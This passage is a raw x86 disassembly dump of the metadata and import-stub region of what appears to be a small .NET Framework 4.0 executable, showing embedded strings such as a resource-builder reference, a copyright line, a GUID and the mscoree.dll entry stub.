  407972:	04 06                	add    $0x6,%al
  407974:	12 80 ad 06 20 01    	adc    0x12006ad(%eax),%al
  40797a:	01 12                	add    %edx,(%edx)
  40797c:	80 ad 05 20 00 12 80 	subb   $0x80,0x12002005(%ebp)
  407983:	ad                   	lods   %ds:(%esi),%eax
  407984:	03 20                	add    (%eax),%esp
  407986:	00 06                	add    %al,(%esi)
  407988:	05 20 01 1d 05       	add    $0x51d0120,%eax
  40798d:	08 08                	or     %cl,(%eax)
  40798f:	00 04 1c             	add    %al,(%esp,%ebx,1)
  407992:	0e                   	push   %cs
  407993:	0e                   	push   %cs
  407994:	1c 11                	sbb    $0x11,%al
  407996:	0c 0a                	or     $0xa,%al
  407998:	00 05 02 0e 0e 1c    	add    %al,0x1c0e0e02
  40799e:	11 0d 11 0c 08 20    	adc    %ecx,0x20080c11
  4079a4:	00 15 12 4c 01 13    	add    %dl,0x13014c12
  4079aa:	00 03                	add    %al,(%ebx)
  4079ac:	06                   	push   %es
  4079ad:	12 5d 09             	adc    0x9(%ebp),%bl
  4079b0:	00 04 01             	add    %al,(%ecx,%eax,1)
  4079b3:	0e                   	push   %cs
  4079b4:	0e                   	push   %cs
  4079b5:	1d 05 1d 05 05       	sbb    $0x5051d05,%eax
  4079ba:	00 02                	add    %al,(%edx)
  4079bc:	18 0e                	sbb    %cl,(%esi)
  4079be:	0e                   	push   %cs
  4079bf:	04 00                	add    $0x0,%al
  4079c1:	01 18                	add    %ebx,(%eax)
  4079c3:	0e                   	push   %cs
  4079c4:	05 00 02 18 18       	add    $0x18180200,%eax
  4079c9:	0e                   	push   %cs
  4079ca:	04 00                	add    $0x0,%al
  4079cc:	01 02                	add    %eax,(%edx)
  4079ce:	18 08                	sbb    %cl,(%eax)
  4079d0:	00 04 08             	add    %al,(%eax,%ecx,1)
  4079d3:	18 18                	sbb    %bl,(%eax)
  4079d5:	09 10                	or     %edx,(%eax)
  4079d7:	09 0a                	or     %ecx,(%edx)
  4079d9:	00 07                	add    %al,(%edi)
  4079db:	18 0e                	sbb    %cl,(%esi)
  4079dd:	09 09                	or     %ecx,(%ecx)
  4079df:	18 09                	sbb    %cl,(%ecx)
  4079e1:	09 18                	or     %ebx,(%eax)
  4079e3:	09 00                	or     %eax,(%eax)
  4079e5:	06                   	push   %es
  4079e6:	18 18                	sbb    %bl,(%eax)
  4079e8:	18 09                	sbb    %cl,(%ecx)
  4079ea:	09 09                	or     %ecx,(%ecx)
  4079ec:	0e                   	push   %cs
  4079ed:	08 00                	or     %al,(%eax)
  4079ef:	05 18 18 09 09       	add    $0x9091818,%eax
  4079f4:	09 18                	or     %ebx,(%eax)
  4079f6:	06                   	push   %es
  4079f7:	00 03                	add    %al,(%ebx)
  4079f9:	18 18                	sbb    %bl,(%eax)
  4079fb:	18 18                	sbb    %bl,(%eax)
  4079fd:	09 00                	or     %eax,(%eax)
  4079ff:	04 02                	add    $0x2,%al
  407a01:	18 18                	sbb    %bl,(%eax)
  407a03:	10 11                	adc    %dl,(%ecx)
  407a05:	38 09                	cmp    %cl,(%ecx)
  407a07:	02 06                	add    (%esi),%al
  407a09:	18 02                	sbb    %al,(%edx)
  407a0b:	06                   	push   %es
  407a0c:	09 04 06             	or     %eax,(%esi,%eax,1)
  407a0f:	12 81 11 04 06 12    	adc    0x12060411(%ecx),%al
  407a15:	80 85 05 00 00 12 81 	addb   $0x81,0x12000005(%ebp)
  407a1c:	11 05 00 00 12 80    	adc    %eax,0x80120000
  407a22:	85 06                	test   %eax,(%esi)
  407a24:	00 01                	add    %al,(%ecx)
  407a26:	01 12                	add    %edx,(%edx)
  407a28:	80 85 04 00 00 1d 05 	addb   $0x5,0x1d000004(%ebp)
  407a2f:	04 20                	add    $0x20,%al
  407a31:	00 13                	add    %dl,(%ebx)
  407a33:	00 03                	add    %al,(%ebx)
  407a35:	06                   	push   %es
  407a36:	12 54 03 00          	adc    0x0(%ebx,%eax,1),%dl
  407a3a:	00 0a                	add    %cl,(%edx)
  407a3c:	06                   	push   %es
  407a3d:	00 01                	add    %al,(%ecx)
  407a3f:	08 12                	or     %dl,(%edx)
  407a41:	81 55 03 20 00 0a 04 	adcl   $0x40a0020,0x3(%ebp)
  407a48:	20 01                	and    %al,(%ecx)
  407a4a:	01 0a                	add    %ecx,(%edx)
  407a4c:	03 00                	add    (%eax),%eax
  407a4e:	00 08                	add    %cl,(%eax)
  407a50:	05 00 02 08 08       	add    $0x8080200,%eax
  407a55:	08 04 01             	or     %al,(%ecx,%eax,1)
  407a58:	00 00                	add    %al,(%eax)
  407a5a:	00 05 15 12 4c 01    	add    %al,0x14c1215
  407a60:	08 05 15 12 30 01    	or     %al,0x1301215
  407a66:	08 40 01             	or     %al,0x1(%eax)
  407a69:	00 33                	add    %dh,(%ebx)
  407a6b:	53                   	push   %ebx
  407a6c:	79 73                	jns    0x407ae1
  407a6e:	74 65                	je     0x407ad5
  407a70:	6d                   	insl   (%dx),%es:(%edi)
  407a71:	2e 52                	cs push %edx
  407a73:	65 73 6f             	gs jae 0x407ae5
  407a76:	75 72                	jne    0x407aea
  407a78:	63 65 73             	arpl   %esp,0x73(%ebp)
  407a7b:	2e 54                	cs push %esp
  407a7d:	6f                   	outsl  %ds:(%esi),(%dx)
  407a7e:	6f                   	outsl  %ds:(%esi),(%dx)
  407a7f:	6c                   	insb   (%dx),%es:(%edi)
  407a80:	73 2e                	jae    0x407ab0
  407a82:	53                   	push   %ebx
  407a83:	74 72                	je     0x407af7
  407a85:	6f                   	outsl  %ds:(%esi),(%dx)
  407a86:	6e                   	outsb  %ds:(%esi),(%dx)
  407a87:	67 6c                	insb   (%dx),%es:(%di)
  407a89:	79 54                	jns    0x407adf
  407a8b:	79 70                	jns    0x407afd
  407a8d:	65 64 52             	gs fs push %edx
  407a90:	65 73 6f             	gs jae 0x407b02
  407a93:	75 72                	jne    0x407b07
  407a95:	63 65 42             	arpl   %esp,0x42(%ebp)
  407a98:	75 69                	jne    0x407b03
  407a9a:	6c                   	insb   (%dx),%es:(%edi)
  407a9b:	64 65 72 07          	fs gs jb 0x407aa6
  407a9f:	34 2e                	xor    $0x2e,%al
  407aa1:	30 2e                	xor    %ch,(%esi)
  407aa3:	30 2e                	xor    %ch,(%esi)
  407aa5:	30 00                	xor    %al,(%eax)
  407aa7:	00 05 20 02 01 0e    	add    %al,0xe010220
  407aad:	0e                   	push   %cs
  407aae:	08 01                	or     %al,(%ecx)
  407ab0:	00 08                	add    %cl,(%eax)
  407ab2:	00 00                	add    %al,(%eax)
  407ab4:	00 00                	add    %al,(%eax)
  407ab6:	00 1e                	add    %bl,(%esi)
  407ab8:	01 00                	add    %eax,(%eax)
  407aba:	01 00                	add    %eax,(%eax)
  407abc:	54                   	push   %esp
  407abd:	02 16                	add    (%esi),%dl
  407abf:	57                   	push   %edi
  407ac0:	72 61                	jb     0x407b23
  407ac2:	70 4e                	jo     0x407b12
  407ac4:	6f                   	outsl  %ds:(%esi),(%dx)
  407ac5:	6e                   	outsb  %ds:(%esi),(%dx)
  407ac6:	45                   	inc    %ebp
  407ac7:	78 63                	js     0x407b2c
  407ac9:	65 70 74             	gs jo  0x407b40
  407acc:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  407ad3:	77 73                	ja     0x407b48
  407ad5:	01 0a                	add    %ecx,(%edx)
  407ad7:	01 00                	add    %eax,(%eax)
  407ad9:	05 64 61 74 61       	add    $0x61746164,%eax
  407ade:	31 00                	xor    %eax,(%eax)
  407ae0:	00 04 20             	add    %al,(%eax,%eiz,1)
  407ae3:	01 01                	add    %eax,(%ecx)
  407ae5:	0e                   	push   %cs
  407ae6:	05 01 00 00 00       	add    $0x1,%eax
  407aeb:	00 17                	add    %dl,(%edi)
  407aed:	01 00                	add    %eax,(%eax)
  407aef:	12 43 6f             	adc    0x6f(%ebx),%al
  407af2:	70 79                	jo     0x407b6d
  407af4:	72 69                	jb     0x407b5f
  407af6:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  407afc:	20 20                	and    %ah,(%eax)
  407afe:	32 30                	xor    (%eax),%dh
  407b00:	32 33                	xor    (%ebx),%dh
  407b02:	00 00                	add    %al,(%eax)
  407b04:	04 20                	add    $0x20,%al
  407b06:	01 01                	add    %eax,(%ecx)
  407b08:	02 29                	add    (%ecx),%ch
  407b0a:	01 00                	add    %eax,(%eax)
  407b0c:	24 66                	and    $0x66,%al
  407b0e:	32 32                	xor    (%edx),%dh
  407b10:	37                   	aaa
  407b11:	39 34 36             	cmp    %esi,(%esi,%esi,1)
  407b14:	34 2d                	xor    $0x2d,%al
  407b16:	66 66 61             	data16 popaw
  407b19:	35 2d 34 36 30       	xor    $0x3036342d,%eax
  407b1e:	64 2d 62 34 63 37    	fs sub $0x37633462,%eax
  407b24:	2d 34 66 33 64       	sub    $0x64336634,%eax
  407b29:	35 34 32 34 38       	xor    $0x38343234,%eax
  407b2e:	64 34 39             	fs xor $0x39,%al
  407b31:	00 00                	add    %al,(%eax)
  407b33:	0c 01                	or     $0x1,%al
  407b35:	00 07                	add    %al,(%edi)
  407b37:	31 2e                	xor    %ebp,(%esi)
  407b39:	30 2e                	xor    %ch,(%esi)
  407b3b:	30 2e                	xor    %ch,(%esi)
  407b3d:	30 00                	xor    %al,(%eax)
  407b3f:	00 47 01             	add    %al,0x1(%edi)
  407b42:	00 1a                	add    %bl,(%edx)
  407b44:	2e 4e                	cs dec %esi
  407b46:	45                   	inc    %ebp
  407b47:	54                   	push   %esp
  407b48:	46                   	inc    %esi
  407b49:	72 61                	jb     0x407bac
  407b4b:	6d                   	insl   (%dx),%es:(%edi)
  407b4c:	65 77 6f             	gs ja  0x407bbe
  407b4f:	72 6b                	jb     0x407bbc
  407b51:	2c 56                	sub    $0x56,%al
  407b53:	65 72 73             	gs jb  0x407bc9
  407b56:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  407b5d:	30 01                	xor    %al,(%ecx)
  407b5f:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  407b63:	46                   	inc    %esi
  407b64:	72 61                	jb     0x407bc7
  407b66:	6d                   	insl   (%dx),%es:(%edi)
  407b67:	65 77 6f             	gs ja  0x407bd9
  407b6a:	72 6b                	jb     0x407bd7
  407b6c:	44                   	inc    %esp
  407b6d:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  407b74:	61                   	popa
  407b75:	6d                   	insl   (%dx),%es:(%edi)
  407b76:	65 10 2e             	adc    %ch,%gs:(%esi)
  407b79:	4e                   	dec    %esi
  407b7a:	45                   	inc    %ebp
  407b7b:	54                   	push   %esp
  407b7c:	20 46 72             	and    %al,0x72(%esi)
  407b7f:	61                   	popa
  407b80:	6d                   	insl   (%dx),%es:(%edi)
  407b81:	65 77 6f             	gs ja  0x407bf3
  407b84:	72 6b                	jb     0x407bf1
  407b86:	20 34 05 00 00 12 81 	and    %dh,-0x7eee0000(,%eax,1)
  407b8d:	51                   	push   %ecx
  407b8e:	03 07                	add    (%edi),%eax
  407b90:	01 08                	add    %ecx,(%eax)
  407b92:	04 07                	add    $0x7,%al
  407b94:	01 12                	add    %edx,(%edx)
  407b96:	10 28                	adc    %ch,(%eax)
  407b98:	07                   	pop    %es
  407b99:	1a 0e                	sbb    (%esi),%cl
  407b9b:	0e                   	push   %cs
  407b9c:	08 0e                	or     %cl,(%esi)
  407b9e:	0e                   	push   %cs
  407b9f:	0e                   	push   %cs
  407ba0:	0e                   	push   %cs
  407ba1:	0e                   	push   %cs
  407ba2:	1d 05 0e 0e 1d       	sbb    $0x1d0e0e05,%eax
  407ba7:	0e                   	push   %cs
  407ba8:	12 80 c9 0e 1c 1d    	adc    0x1d1c0ec9(%eax),%al
  407bae:	05 12 81 0d 12       	add    $0x120d8112,%eax
  407bb3:	81 4d 12 80 d9 0e 0e 	orl    $0xe0ed980,0x12(%ebp)
  407bba:	0e                   	push   %cs
  407bbb:	0e                   	push   %cs
  407bbc:	0e                   	push   %cs
  407bbd:	1d 05 02 07 20       	sbb    $0x20070205,%eax
  407bc2:	03 01                	add    (%ecx),%eax
  407bc4:	02 0e                	add    (%esi),%cl
  407bc6:	10 02                	adc    %al,(%edx)
  407bc8:	05 00 01 0e 11       	add    $0x110e0100,%eax
  407bcd:	7d 05                	jge    0x407bd4
  407bcf:	00 02                	add    %al,(%edx)
  407bd1:	0e                   	push   %cs
  407bd2:	0e                   	push   %cs
  407bd3:	0e                   	push   %cs
  407bd4:	04 00                	add    $0x0,%al
  407bd6:	01 02                	add    %eax,(%edx)
  407bd8:	0e                   	push   %cs
  407bd9:	04 20                	add    $0x20,%al
  407bdb:	01 08                	add    %ecx,(%eax)
  407bdd:	08 06                	or     %al,(%esi)
  407bdf:	00 03                	add    %al,(%ebx)
  407be1:	0e                   	push   %cs
  407be2:	0e                   	push   %cs
  407be3:	0e                   	push   %cs
  407be4:	0e                   	push   %cs
  407be5:	05 00 02 01 0e       	add    $0xe010200,%eax
  407bea:	0e                   	push   %cs
  407beb:	06                   	push   %es
  407bec:	00 02                	add    %al,(%edx)
  407bee:	01 0e                	add    %ecx,(%esi)
  407bf0:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  407bf5:	0e                   	push   %cs
  407bf6:	1d 0e 03 20 00       	sbb    $0x20030e,%eax
  407bfb:	0e                   	push   %cs
  407bfc:	05 00 02 02 0e       	add    $0xe020200,%eax
  407c01:	0e                   	push   %cs
  407c02:	02 1d 05 05 00 01    	add    0x1000505,%bl
  407c08:	1d 05 0e 07 00       	sbb    $0x70e05,%eax
  407c0d:	01 12                	add    %edx,(%edx)
  407c0f:	80 dd 1d             	sbb    $0x1d,%ch
  407c12:	05 05 20 00 12       	add    $0x12002005,%eax
  407c17:	81 0d 06 20 02 1c 1c 	orl    $0x31c1d1c,0x1c022006
  407c1e:	1d 1c 03 
  407c21:	07                   	pop    %es
  407c22:	01 02                	add    %eax,(%edx)
  407c24:	04 00                	add    $0x0,%al
  407c26:	00 12                	add    %dl,(%edx)
  407c28:	5d                   	pop    %ebp
  407c29:	03 20                	add    (%eax),%esp
  407c2b:	00 18                	add    %bl,(%eax)
  407c2d:	04 00                	add    $0x0,%al
  407c2f:	01 01                	add    %eax,(%ecx)
  407c31:	08 07                	or     %al,(%edi)
  407c33:	07                   	pop    %es
  407c34:	02 12                	add    (%edx),%dl
  407c36:	80 a5 1d 05 05 20 01 	andb   $0x1,0x2005051d(%ebp)
  407c3d:	01 1d 05 09 20 02    	add    %ebx,0x2200905
  407c43:	01 12                	add    %edx,(%edx)
  407c45:	80 ad 11 80 8d 04 20 	subb   $0x20,0x48d8011(%ebp)
  407c4c:	00 1d 05 1e 07 10    	add    %bl,0x10071e05
  407c52:	15 12 35 01 0e       	adc    $0xe013512,%eax
  407c57:	08 0e                	or     %cl,(%esi)
  407c59:	12 81 45 08 08 08    	adc    0x8080845(%ecx),%al
  407c5f:	12 81 45 12 81 45    	adc    0x45811245(%ecx),%al
  407c65:	0e                   	push   %cs
  407c66:	0e                   	push   %cs
  407c67:	0e                   	push   %cs
  407c68:	12 80 d9 0e 0e 0e    	adc    0xe0e0ed9(%eax),%al
  407c6e:	04 20                	add    $0x20,%al
  407c70:	01 08                	add    %ecx,(%eax)
  407c72:	0e                   	push   %cs
  407c73:	05 20 02 0e 0e       	add    $0xe0e0220,%eax
  407c78:	0e                   	push   %cs
  407c79:	05 15 12 35 01       	add    $0x1351215,%eax
  407c7e:	0e                   	push   %cs
  407c7f:	05 20 02 0e 08       	add    $0x80e0220,%eax
  407c84:	08 05 20 01 02 13    	or     %al,0x13020120
  407c8a:	00 05 20 01 01 13    	add    %al,0x13010120
  407c90:	00 05 20 01 13 00    	add    %al,0x130120
  407c96:	08 04 20             	or     %al,(%eax,%eiz,1)
  407c99:	01 03                	add    %eax,(%ebx)
  407c9b:	08 06                	or     %al,(%esi)
  407c9d:	20 01                	and    %al,(%ecx)
  407c9f:	12 81 45 03 06 20    	adc    0x20060345(%ecx),%al
  407ca5:	01 12                	add    %edx,(%edx)
  407ca7:	81 45 0e 0b 07 05 12 	addl   $0x1205070b,0xe(%ebp)
  407cae:	80 d9 12             	sbb    $0x12,%cl
  407cb1:	81 45 08 08 0e 06 07 	addl   $0x7060e08,0x8(%ebp)
  407cb8:	02 12                	add    (%edx),%dl
  407cba:	18 12                	sbb    %dl,(%edx)
  407cbc:	5d                   	pop    %ebp
  407cbd:	04 20                	add    $0x20,%al
  407cbf:	00 12                	add    %dl,(%edx)
  407cc1:	69 05 20 02 01 1c 18 	imul   $0x1200518,0x1c010220,%eax
  407cc8:	05 20 01 
  407ccb:	01 12                	add    %edx,(%edx)
  407ccd:	4d                   	dec    %ebp
  407cce:	04 20                	add    $0x20,%al
  407cd0:	01 02                	add    %eax,(%edx)
  407cd2:	08 03                	or     %al,(%ebx)
  407cd4:	07                   	pop    %es
  407cd5:	01 0e                	add    %ecx,(%esi)
  407cd7:	06                   	push   %es
  407cd8:	00 01                	add    %al,(%ecx)
  407cda:	12 80 99 0e 11 07    	adc    0x7110e99(%eax),%al
  407ce0:	09 08                	or     %ecx,(%eax)
  407ce2:	08 08                	or     %cl,(%eax)
  407ce4:	08 12                	or     %dl,(%edx)
  407ce6:	6d                   	insl   (%dx),%es:(%edi)
  407ce7:	12 71 08             	adc    0x8(%ecx),%dh
  407cea:	12 81 55 12 81 09    	adc    0x9811255(%ecx),%al
  407cf0:	06                   	push   %es
  407cf1:	15 12 2d 02 08       	adc    $0x8022d12,%eax
  407cf6:	0e                   	push   %cs
  407cf7:	05 20 02 01 08       	add    $0x8010220,%eax
  407cfc:	02 05 20 01 12 6d    	add    0x6d120120,%al
  407d02:	08 05 20 00 12 81    	or     %al,0x81120020
  407d08:	09 05 20 00 12 81    	or     %eax,0x81120020
  407d0e:	55                   	push   %ebp
  407d0f:	08 00                	or     %al,(%eax)
  407d11:	01 12                	add    %edx,(%edx)
  407d13:	81 55 11 81 35 09 00 	adcl   $0x93581,0x11(%ebp)
  407d1a:	02 02                	add    (%edx),%al
  407d1c:	12 81 55 12 81 55    	adc    0x55811255(%ecx),%al
  407d22:	08 20                	or     %ah,(%eax)
  407d24:	02 02                	add    (%edx),%al
  407d26:	13 00                	adc    (%eax),%eax
  407d28:	10 13                	adc    %dl,(%ebx)
  407d2a:	01 6b 07             	add    %ebp,0x7(%ebx)
  407d2d:	42                   	inc    %edx
  407d2e:	08 08                	or     %cl,(%eax)
  407d30:	08 08                	or     %cl,(%eax)
  407d32:	0e                   	push   %cs
  407d33:	1d 05 12 81 45       	sbb    $0x45811205,%eax
  407d38:	08 08                	or     %cl,(%eax)
  407d3a:	08 08                	or     %cl,(%eax)
  407d3c:	08 08                	or     %cl,(%eax)
  407d3e:	1d 05 08 02 1d       	sbb    $0x1d020805,%eax
  407d43:	05 08 12 71 12       	add    $0x12711208,%eax
  407d48:	6d                   	insl   (%dx),%es:(%edi)
  407d49:	08 1d 03 07 08 15    	or     %bl,0x15080703
  407d4f:	12 4c 01 08          	adc    0x8(%ecx,%eax,1),%cl
  407d53:	1d 05 08 1d 05       	sbb    $0x51d0805,%eax
  407d58:	05 08 08 1d 05       	add    $0x51d0808,%eax
  407d5d:	09 06                	or     %eax,(%esi)
  407d5f:	08 05 1d 05 12 80    	or     %al,0x8012051d
  407d65:	dd 06                	fldl   (%esi)
  407d67:	12 80 dd 1d 03 12    	adc    0x12031ddd(%eax),%al
  407d6d:	81 09 15 12 2d 02    	orl    $0x22d1215,(%ecx)
  407d73:	08 0e                	or     %cl,(%esi)
  407d75:	05 08 15 12 2d       	add    $0x2d121508,%eax
  407d7a:	02 08                	add    (%eax),%cl
  407d7c:	0e                   	push   %cs
  407d7d:	08 12                	or     %dl,(%edx)
  407d7f:	81 55 05 02 12 80 f5 	adcl   $0xf5801202,0x5(%ebp)
  407d86:	02 08                	add    (%eax),%cl
  407d88:	08 08                	or     %cl,(%eax)
  407d8a:	0a 02                	or     (%edx),%al
  407d8c:	05 02 02 12 80       	add    $0x80120202,%eax
  407d91:	ad                   	lods   %ds:(%esi),%eax
  407d92:	08 08                	or     %cl,(%eax)
  407d94:	0e                   	push   %cs
  407d95:	08 08                	or     %cl,(%eax)
  407d97:	06                   	push   %es
  407d98:	00 02                	add    %al,(%edx)
  407d9a:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  407d9d:	02 05 00 00 12 80    	add    0x80120000,%al
  407da3:	dd 06                	fldl   (%esi)
  407da5:	20 01                	and    %al,(%ecx)
  407da7:	12 80 ad 0e 05 20    	adc    0x20050ead(%eax),%al
  407dad:	01 01                	add    %eax,(%ecx)
  407daf:	1d 03 04 00 01       	sbb    $0x1000403,%eax
  407db4:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  407dbb:	41                   	inc    %ecx
  407dbc:	07                   	pop    %es
  407dbd:	20 03                	and    %al,(%ebx)
  407dbf:	0e                   	push   %cs
  407dc0:	1d 05 08 08 04       	sbb    $0x4080805,%eax
  407dc5:	20 01                	and    %al,(%ecx)
  407dc7:	0e                   	push   %cs
  407dc8:	0e                   	push   %cs
  407dc9:	07                   	pop    %es
  407dca:	20 02                	and    %al,(%edx)
  407dcc:	01 13                	add    %edx,(%ebx)
  407dce:	00 13                	add    %dl,(%ebx)
  407dd0:	01 05 07 01 12 80    	add    %eax,0x80120107
  407dd6:	f5                   	cmc
  407dd7:	05 20 00 12 80       	add    $0x80120020,%eax
  407ddc:	f5                   	cmc
  407ddd:	04 07                	add    $0x7,%al
  407ddf:	01 1d 05 0c 07 04    	add    %ebx,0x4070c05
  407de5:	12 6d 12             	adc    0x12(%ebp),%ch
  407de8:	80 dd 12             	sbb    $0x12,%ch
  407deb:	80 f5 1d             	xor    $0x1d,%ch
  407dee:	05 05 20 00 12       	add    $0x12002005,%eax
  407df3:	80 dd 09             	sbb    $0x9,%ch
  407df6:	00 02                	add    %al,(%edx)
  407df8:	02 12                	add    (%edx),%dl
  407dfa:	80 dd 12             	sbb    $0x12,%ch
  407dfd:	80 dd 09             	sbb    $0x9,%ch
  407e00:	07                   	pop    %es
  407e01:	07                   	pop    %es
  407e02:	08 08                	or     %cl,(%eax)
  407e04:	08 08                	or     %cl,(%eax)
  407e06:	08 08                	or     %cl,(%eax)
  407e08:	08 04 07             	or     %al,(%edi,%eax,1)
  407e0b:	02 08                	add    (%eax),%cl
  407e0d:	08 07                	or     %al,(%edi)
  407e0f:	20 03                	and    %al,(%ebx)
  407e11:	08 1d 05 08 08 05    	or     %bl,0x5080805
  407e17:	07                   	pop    %es
  407e18:	01 12                	add    %edx,(%edx)
  407e1a:	80 ad 08 07 04 1d 05 	subb   $0x5,0x1d040708(%ebp)
  407e21:	08 08                	or     %cl,(%eax)
  407e23:	1d 05 0a 00 05       	sbb    $0x5000a05,%eax
  407e28:	01 12                	add    %edx,(%edx)
  407e2a:	15 08 12 15 08       	adc    $0x8151208,%eax
  407e2f:	08 05 07 02 12 09    	or     %al,0x9120207
  407e35:	1c 03                	sbb    $0x3,%al
  407e37:	06                   	push   %es
  407e38:	12 09                	adc    (%ecx),%cl
  407e3a:	05 20 01 12 09       	add    $0x9120120,%eax
  407e3f:	0e                   	push   %cs
  407e40:	05 20 02 1c 0e       	add    $0xe1c0220,%eax
  407e45:	1c 05                	sbb    $0x5,%al
  407e47:	07                   	pop    %es
  407e48:	02 12                	add    (%edx),%dl
  407e4a:	09 02                	or     %eax,(%edx)
  407e4c:	07                   	pop    %es
  407e4d:	20 03                	and    %al,(%ebx)
  407e4f:	01 0e                	add    %ecx,(%esi)
  407e51:	1c 11                	sbb    $0x11,%al
  407e53:	0d 05 00 00 12       	or     $0x12000005,%eax
  407e58:	80 d5 05             	adc    $0x5,%ch
  407e5b:	20 00                	and    %al,(%eax)
  407e5d:	12 81 69 06 07 03    	adc    0x3070669(%ecx),%al
  407e63:	18 09                	sbb    %cl,(%ecx)
  407e65:	1d 05 05 00 02       	sbb    $0x2000505,%eax
  407e6a:	02 18                	add    (%eax),%bl
  407e6c:	18 04 00             	sbb    %al,(%eax,%eax,1)
  407e6f:	01 18                	add    %ebx,(%eax)
  407e71:	08 08                	or     %cl,(%eax)
  407e73:	00 04 01             	add    %al,(%ecx,%eax,1)
  407e76:	1d 05 08 18 08       	sbb    $0x8180805,%eax
  407e7b:	12 07                	adc    (%edi),%al
  407e7d:	0f 18 18             	prefetcht2 (%eax)
  407e80:	18 18                	sbb    %bl,(%eax)
  407e82:	06                   	push   %es
  407e83:	08 18                	or     %bl,(%eax)
  407e85:	08 09                	or     %cl,(%ecx)
  407e87:	0e                   	push   %cs
  407e88:	09 11                	or     %edx,(%ecx)
  407e8a:	38 02                	cmp    %al,(%edx)
  407e8c:	06                   	push   %es
  407e8d:	06                   	push   %es
  407e8e:	04 00                	add    $0x0,%al
  407e90:	01 08                	add    %ecx,(%eax)
  407e92:	1c 04                	sbb    $0x4,%al
  407e94:	00 01                	add    %al,(%ecx)
  407e96:	0a 18                	or     (%eax),%bl
  407e98:	04 00                	add    $0x0,%al
  407e9a:	01 18                	add    %ebx,(%eax)
  407e9c:	0a 04 00             	or     (%eax,%eax,1),%al
  407e9f:	01 08                	add    %ecx,(%eax)
  407ea1:	18 04 00             	sbb    %al,(%eax,%eax,1)
  407ea4:	01 06                	add    %eax,(%esi)
  407ea6:	18 05 00 02 06 18    	sbb    %al,0x18060200
  407eac:	08 04 00             	or     %al,(%eax,%eax,1)
  407eaf:	01 05 18 0a 07 04    	add    %eax,0x4070a18
  407eb5:	12 39                	adc    (%ecx),%bh
  407eb7:	12 61 18             	adc    0x18(%ecx),%ah
  407eba:	12 80 89 04 20 00    	adc    0x200489(%eax),%al
  407ec0:	12 65 04             	adc    0x4(%ebp),%ah
  407ec3:	20 00                	and    %al,(%eax)
  407ec5:	12 39                	adc    (%ecx),%bh
  407ec7:	04 20                	add    $0x20,%al
  407ec9:	01 02                	add    %eax,(%edx)
  407ecb:	0e                   	push   %cs
  407ecc:	0f 07                	sysret
  407ece:	0d 08 08 18 0a       	or     $0xa180808,%eax
  407ed3:	08 0a                	or     %cl,(%edx)
  407ed5:	08 08                	or     %cl,(%eax)
  407ed7:	08 08                	or     %cl,(%eax)
  407ed9:	08 08                	or     %cl,(%eax)
  407edb:	08 04 00             	or     %al,(%eax,%eax,1)
  407ede:	01 0e                	add    %ecx,(%esi)
  407ee0:	18 07                	sbb    %al,(%edi)
  407ee2:	20 02                	and    %al,(%edx)
  407ee4:	02 0e                	add    (%esi),%cl
  407ee6:	11 81 3d 07 20 02    	adc    %eax,0x220073d(%ecx)
  407eec:	01 0e                	add    %ecx,(%esi)
  407eee:	12 80 dd 07 20 02    	adc    0x22007dd(%eax),%al
  407ef4:	1c 0e                	sbb    $0xe,%al
  407ef6:	12 80 85 18 07 0c    	adc    0xc071885(%eax),%al
  407efc:	0b 15 12 35 01 05    	or     0x5013512,%edx
  407f02:	0a 1d 05 08 08 08    	or     0x8080805,%bl
  407f08:	12 80 f5 12 80 dd    	adc    -0x227fed0b(%eax),%al
  407f0e:	08 0a                	or     %cl,(%edx)
  407f10:	12 54 05 15          	adc    0x15(%ebp,%eax,1),%dl
  407f14:	12 35 01 05 09 20    	adc    0x20090501,%dh
  407f1a:	01 01                	add    %eax,(%ecx)
  407f1c:	15 12 31 01 13       	adc    $0x13013112,%eax
  407f21:	00 05 20 01 1d 05    	add    %al,0x51d0120
  407f27:	0e                   	push   %cs
  407f28:	06                   	push   %es
  407f29:	20 02                	and    %al,(%edx)
  407f2b:	01 08                	add    %ecx,(%eax)
  407f2d:	13 00                	adc    (%eax),%eax
  407f2f:	0c 07                	or     $0x7,%al
  407f31:	04 12                	add    $0x12,%al
  407f33:	71 12                	jno    0x407f47
  407f35:	6d                   	insl   (%dx),%es:(%edi)
  407f36:	12 81 09 12 81 55    	adc    0x55811209(%ecx),%al
  407f3c:	0b 07                	or     (%edi),%eax
  407f3e:	08 1d 08 08 08 08    	or     %bl,0x8080808
  407f44:	08 08                	or     %cl,(%eax)
  407f46:	0b 08                	or     (%eax),%ecx
  407f48:	0a 07                	or     (%edi),%al
  407f4a:	07                   	pop    %es
  407f4b:	1d 08 08 08 08       	sbb    $0x8080808,%eax
  407f50:	08 08                	or     %cl,(%eax)
  407f52:	08 00                	or     %al,(%eax)
  407f54:	7c 7f                	jl     0x407fd5
	...
  407f5e:	00 00                	add    %al,(%eax)
  407f60:	9e                   	sahf
  407f61:	7f 00                	jg     0x407f63
  407f63:	00 00                	add    %al,(%eax)
  407f65:	20 00                	and    %al,(%eax)
	...
  407f7b:	00 90 7f 00 00 00    	add    %dl,0x7f(%eax)
	...
  407f91:	00 5f 43             	add    %bl,0x43(%edi)
  407f94:	6f                   	outsl  %ds:(%esi),(%dx)
  407f95:	72 45                	jb     0x407fdc
  407f97:	78 65                	js     0x407ffe
  407f99:	4d                   	dec    %ebp
  407f9a:	61                   	popa
  407f9b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  407fa2:	72 65                	jb     0x408009
  407fa4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  407fa8:	6c                   	insb   (%dx),%es:(%edi)
  407fa9:	00 00                	add    %al,(%eax)
  407fab:	00 00                	add    %al,(%eax)
  407fad:	00 ff                	add    %bh,%bh
  407faf:	25 00 20 40 00       	and    $0x402000,%eax
